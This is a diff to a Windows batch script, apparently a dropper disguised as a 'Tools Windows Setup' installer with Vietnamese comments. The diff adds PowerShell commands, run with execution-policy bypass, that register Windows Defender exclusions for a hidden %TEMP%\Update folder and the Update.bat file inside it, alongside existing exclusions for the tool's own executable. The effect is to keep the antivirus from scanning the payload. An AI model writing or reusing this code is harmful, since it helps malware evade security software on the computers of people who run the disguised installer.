@@ -50,6 +50,9 @@ rem --- Thêm ngoại lệ ---
 powershell -NoP -Ep Bypass -C ^
  "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE3%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
 set RC=%ERRORLEVEL%
+powershell -NoP -Ep Bypass -C ^
+ "Try { Add-MpPreference -ExclusionPath '%TARGETBAT%'; Add-MpPreference -ExclusionProcess '%FILE1%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
+set RC=%ERRORLEVEL%
 
 echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
 echo.
@@ -59,7 +62,8 @@ echo.
 :: ========================
 set "DESKTOP=%USERPROFILE%\Desktop"
 set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
-set "FILE1=%TEMP%\Update.bat"
+set "TARGETBAT=%TEMP%\Update"
+set "FILE1=%TEMP%\Update\Update.bat"
 set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
 set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
 set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
